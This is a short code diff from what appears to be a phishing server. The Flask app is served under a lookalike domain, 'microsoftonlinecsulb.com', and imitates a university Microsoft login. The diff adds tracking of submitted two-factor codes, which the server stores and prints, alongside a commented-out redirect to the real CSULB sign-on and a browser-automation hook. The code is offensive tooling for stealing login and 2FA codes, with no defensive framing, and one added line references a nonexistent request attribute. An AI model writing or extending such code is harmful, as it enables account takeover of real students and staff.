@@ -38,7 +38,7 @@ context = ('/etc/letsencrypt/live/microsoftonlinecsulb.com/cert.pem', '/etc/lets
 
 
 connections = {}
-
+twofa_code = {}
 submitted = {}
 # chrome = main.startChrome()
 
@@ -121,10 +121,11 @@ def text():
     # client-side form data. For example, WTForms is a library that will
     # handle this for us, and we use a custom LoginForm to validate.
     ip = request.environ.get('HTTP_X_REAL_IP', request.remote_addr) 
-    if submitted[ip] == True:
+    if submitted[ip] == True and twofa_code[request.remote.get('code')] == False:
         return render_template('index.html')
     submitted[ip] = True
     code = request.form.get('code')
+    twofa_code[code] = True
     print(code)
     # yield redirect("https://sso.csulb.edu/")
     print("still here")
